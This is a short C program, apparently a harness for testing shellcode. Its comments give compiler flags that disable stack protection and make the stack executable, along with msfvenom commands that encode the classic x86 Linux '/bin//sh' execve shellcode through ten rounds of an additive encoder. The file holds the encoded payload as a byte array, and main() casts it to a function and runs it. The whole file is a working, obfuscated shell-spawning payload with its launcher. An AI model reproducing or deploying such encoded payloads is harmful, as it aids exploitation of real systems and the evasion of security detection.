/*
A simple program to test shellcode
gcc -fno-stack-protector -z execstack tshell.c
*/

#include <stdio.h>
#include <string.h>


// sudo echo -ne "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\xb0\x0b\x89\xe3\xcd\x80" |
// sudo msfvenom -e x86/jmp_call_additive -a x86 -p - --platform linux -f c -i 10
unsigned char code[]= \
"\xfc\xbb\xe3\x33\x10\xac\xeb\x0c\x5e\x56\x31\x1e\xad\x01\xc3"
"\x85\xc0\x75\xf7\xc3\xe8\xef\xff\xff\xff\x1f\x88\x66\x3e\x0c"
"\x0d\x6d\x32\xec\x84\x43\x55\xbd\x28\x67\xec\x7d\x5f\x90\x2c"
"\x95\x4f\xa1\x4c\x9a\x1a\x77\x7e\x35\x90\x4a\x99\x2c\x93\xc7"
"\x76\xf2\xb8\xe7\x4a\x4e\xf7\x4e\x76\xcb\x29\x08\x4e\x26\x34"
"\xee\x6f\xeb\xfb\x05\x0c\xf9\x0b\x10\x0a\x2f\xb6\xad\xb2\x37"
"\xe4\xe4\xa0\x9b\x62\x1c\xbb\x22\x88\x34\xf8\x5e\x88\x21\x85"
"\x85\xe6\x93\xf8\xfd\xeb\x75\x69\x1a\x20\xbb\x3a\xe5\x55\x97"
"\x5c\xbc\x88\x43\x80\xa6\xc1\xda\xcf\x82\x05\xd2\x50\x76\x45"
"\xe6\x3d\xec\x54\x01\xf6\xd0\x49\x0c\x2f\x3f\x0c\xc4\x35\x38"
"\xbc\x17\x5e\xb0\xbf\x53\x7a\x28\x6d\xe0\x2e\xa6\x49\x40\x33"
"\xb2\xb0\x63\x83\x10\xfc\xb7\xa9\xbe\x83\x32\xee\x65\x8d\x31"
"\x5a\x19\x22\x96\xf4\x9f\x7d\xb2\xd4\x14\x83\x7e\xaf\x23\xec"
"\x2f\x6f\x84\x4f\x1f\xdd\x13\x70\xc6\x4a\x28\xed\x93\x76\xc9"
"\xef\x3d\x92\x5b\xfe\x0d\xf5\xc4\x9d\xf8\x48\x3b\xab\x7a\x45"
"\x1e\x50\xf1\x3b\x34\xf7\x97\xb2\x4c\xda\x42\xd6\xba\xe3\x5a"
"\x86\x75\x6d\xfc\xd2\x8d\x10\x9e\x4d\xc7\x2e\xeb\x09\x38\x04"
"\x44\xb0\x12\xcb\xf5\x55\xd9\x9f\xad\x5f\xf2\xdd\x98\x3b\xc7"
"\x77\x58\x33\xe4\x6f\x6b\xf9\xb9\xac\x04\xb9\x3d\x0e\xb4\x11"
"\x8e\x28\xc9\xa3\x00\xac\x32\x63\xad\x6e\xf7\x76\x5f\x7a\xcf"
"\xff\xbf\xb2\x53\x37\xbf\x68\x2f\x99\xa3\x75\xf1\xa7\xc7\x35"
"\xa4\xc5\x14\xb2\x44\x69\x7b\xe7\x56\xec\xa2\x7c\x5b\x6f\x8d"
"\x7d\xa3\x90\x2d\x7e\xa3\x90";

main()
{
	printf("Shellcode Length: %d\n", strlen(code));
	int (*ret)() = (int(*)())code;
	ret();
}

